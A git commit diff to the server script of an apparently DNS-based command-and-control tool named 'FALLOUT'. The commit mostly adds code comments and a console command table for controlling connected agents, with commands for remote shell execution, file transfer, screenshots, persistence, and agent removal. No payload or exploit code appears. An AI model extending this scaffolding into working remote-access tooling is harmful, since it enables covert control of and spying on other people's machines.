4840a4d454e18cebcff86501438ac5273a13f3bf
0xDezzy <Darkpaw95@gmail.com>
2018-06-14 20:43:39 -0500

    update

--- server.py
+++ server.py
@@ -1,29 +1,44 @@
 #!/usr/bin/python
 
 # imports
-import argparse
-import os
-import signal
+import argparse # for parsing arguments
+import os # os commands such as exiting the process
+import signal # signal handling
 import sys
-import threading
+import threading # self explanitory
 import time
-import queue
+import queue # for queueing tasks and the like
 
-from modules import dns, tasker
-from termcolor import colored, cprint
+from modules import dns, tasker # server modules
+from termcolor import colored, cprint # colored terminal output
 
 # variables
-PROMPT = 'FALLOUT:> '
+PROMPT = 'FALLOUT:> ' # Console Prompt
 
-host = ''
-port = 53
+host = '' # The IP
+port = 53 # The Port
 
-q = queue.Queue()
-SocketThread = []
-Agents = {}
+q = queue.Queue() # Set up the queue
+SocketThread = [] # Threads per socket connection
+Agents = {} # array for agents
 
+# Commands for the console
 COMMANDS = {
-    'help':['Shows The help menu']
+    'help':['Shows The help menu'],
+    'exec':['Executes shell commands. Use this sparingly on windows!'],
+    'upload':['Uploads a file to the server'],
+    'download':['Downloads a file. Requires a url'],
+    'screenshot':['Takes a screenshot of the display. This uses API calls in windows.'],
+    'persist':['Select a persistence method for the host.'],
+    'clean':['Uninstalls the agent'],
+    'kill':['Kills the agent'],
+    'exit':['Exits the server console, or if interacting with an agent, goes back to the main console'],
+    'select':['Interact with a specific agent'],
+    'back':['Goes back to the main console'],
+    'ls':['Lists what is in the current directory'],
+    'pwd':['Displays the current working directory'],
+    'hostname':['Prints the hostname'],
+    'getuser':['Shows what user the agent is running as'],    
 }
 
 # Check for root
@@ -44,10 +59,11 @@ class Handler(threading.Thread):
         self.q = qnum
 
     def Run(self):
+        # Runs the process
         AgentName = threading.current_thread().getName()
         cprint(("\n[+] Agent " + self.ip + ":" + str(self.port) + " connected with Thread_ID: ", AgentName), "green")
         Agents[AgentName] = self.agent_address
-        
+
 
 
 
